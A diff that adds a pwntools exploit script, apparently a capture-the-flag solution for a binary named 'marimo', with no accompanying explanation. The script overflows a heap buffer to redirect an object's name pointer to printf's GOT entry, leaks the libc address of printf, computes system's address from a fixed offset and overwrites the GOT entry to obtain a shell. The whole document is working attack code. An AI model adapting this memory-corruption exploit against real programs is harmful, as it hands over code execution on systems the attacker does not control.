@@ -1,0 +1,64 @@
+from pwn import *
+import time
+
+context.update(arch='amd64', os='linux', log_level='debug')
+p = process('marimo')
+
+def createMoss(ch):
+    p.sendline('show me the marimo')
+    p.sendlineafter('name? (0x10)', ch*0x10)
+    p.sendlineafter(')\n', ch*0x32)
+
+    
+
+print p.recvrepeat(0.2)
+createMoss('a')
+print p.recvrepeat(0.2)
+createMoss('b')
+print p.recvrepeat(0.2)
+p.sendline('V')
+
+
+time.sleep(4)
+
+#overwrite moss[1]'s profile address to printf
+elf = ELF('marimo')
+got_printf = elf.got['printf']
+log.info('got_printf : ' + hex(got_printf))
+offset_to_m1name = 0x38
+
+p.sendlineafter('>> ', '0')
+p.sendlineafter('>> ', 'M')
+p.sendlineafter('>> ','a'*offset_to_m1name+p64(got_printf)*2)
+p.sendlineafter('>> ', 'B')
+
+
+p.recvrepeat(0.2)
+p.sendline('V')
+
+#leak printf in libc
+p.sendlineafter('>> ', '1')
+p.recvuntil('name : ')
+addr_printf = u64(p.recvline().replace('\n', '').ljust(8, '\x00'))
+log.info('addr of printf: ' + hex(addr_printf))
+
+
+p.interactive()
+
+#raw_input('debugging: '+ str(p.pid))
+
+dif_system = 0xdbc0 # printf + 0xdbc0 = system
+addr_system = addr_printf + dif_system
+
+p.sendlineafter('>> ', p64(addr_system))
+
+p.interactive()
+
+
+
+
+
+
+
+p.interactive()
+
